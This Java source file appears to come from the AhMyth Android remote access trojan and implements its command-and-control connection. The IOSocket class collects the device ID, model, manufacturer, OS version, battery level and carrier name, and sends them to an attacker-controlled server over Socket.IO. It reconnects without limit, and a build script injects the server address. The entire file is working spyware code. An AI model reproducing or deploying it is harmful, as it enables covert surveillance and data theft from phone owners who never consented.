package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;


/**
 * Created by AhMyth on 10/14/16.
 */
public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;



    private IOSocket() {
        try {
            Context context = MainService.getContextOfApplication();
            String deviceID = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            
            // Get battery level
            int batteryLevel = getBatteryLevel(context);
            
            // Get operator name
            String operator = getOperatorName(context);
            
            // Socket.IO options for stable connection - match server timeouts
            IO.Options opts = new IO.Options();
            opts.timeout = 20000;           // 20 second connection timeout
            opts.reconnection = true;       // Auto reconnect
            opts.reconnectionAttempts = Integer.MAX_VALUE;  // Unlimited reconnection attempts
            opts.reconnectionDelay = 2000;  // 2 second delay between reconnects
            opts.reconnectionDelayMax = 10000;  // Max 10 second delay
            opts.forceNew = true;           // Force new connection to avoid stale states
            opts.randomizationFactor = 0.5; // Randomize reconnection delay
            opts.transports = new String[] {"websocket", "polling"}; // Allow both transports
            
            // This placeholder URL will be replaced during APK build
            // Format: http://IP:PORT - the build script will inject actual server IP/PORT
            // For Android emulator, use 10.0.2.2 to reach host machine
            String url = "http://192.168.0.177:1234?model=" + android.net.Uri.encode(Build.MODEL)
                + "&manf=" + android.net.Uri.encode(Build.MANUFACTURER)
                + "&release=" + Build.VERSION.RELEASE 
                + "&id=" + deviceID
                + "&sdk=" + Build.VERSION.SDK_INT
                + "&battery=" + batteryLevel
                + "&operator=" + android.net.Uri.encode(operator)
                + "&device=" + android.net.Uri.encode(Build.DEVICE)
                + "&brand=" + android.net.Uri.encode(Build.BRAND)
                + "&product=" + android.net.Uri.encode(Build.PRODUCT);
            
            android.util.Log.d("IOSocket", "Connecting to: " + url);
            
            // Pass opts to IO.socket()
            ioSocket = IO.socket(url, opts);
        } catch (URISyntaxException e) {
            android.util.Log.e("IOSocket", "Invalid socket URL", e);
            e.printStackTrace();
        } catch (Exception e) {
            android.util.Log.e("IOSocket", "Error initializing socket", e);
            e.printStackTrace();
        }
    }
    
    private int getBatteryLevel(Context context) {
        try {
            IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            Intent batteryStatus = context.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                return (int) ((level / (float) scale) * 100);
            }
        } catch (Exception e) {
            android.util.Log.e("IOSocket", "Error getting battery level", e);
        }
        return -1;
    }
    
    private String getOperatorName(Context context) {
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                String operator = tm.getNetworkOperatorName();
                if (operator != null && !operator.isEmpty()) {
                    return operator;
                }
                operator = tm.getSimOperatorName();
                if (operator != null && !operator.isEmpty()) {
                    return operator;
                }
            }
        } catch (Exception e) {
            android.util.Log.e("IOSocket", "Error getting operator", e);
        }
        return "Unknown";
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }




}
